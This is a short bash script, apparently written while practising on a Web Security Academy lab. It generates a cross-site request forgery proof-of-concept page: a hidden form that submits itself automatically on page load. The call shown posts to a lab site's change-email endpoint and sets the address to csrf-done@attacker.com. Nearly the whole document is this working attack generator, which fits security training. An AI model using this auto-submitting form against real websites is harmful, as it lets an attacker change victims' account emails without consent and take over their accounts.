#!/bin/bash

as() {
	local cmd="$1"
	local ip="$2" 
	#需要将邮箱拆分成名字 和所属邮箱
	local name=$(echo "$ip" | cut -d = -f1)
	local yx=$(echo "$ip" | cut -d = -f2-)
	local name_yx="<input type=\"hidden\" name=\"$name\" value=\"$yx\">"
    cat <<HTML
<!-- CSRF POC -->
<html>
  <body>
    <form action="${cmd}" method="POST">
${name_yx}    <input type="submit" value="Submit request">
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
HTML
}

echo "开始"
as https://0a9600750395c19481b4078c00f700f8.web-security-academy.net/my-account/change-email email=csrf-done@attacker.com
echo "" 
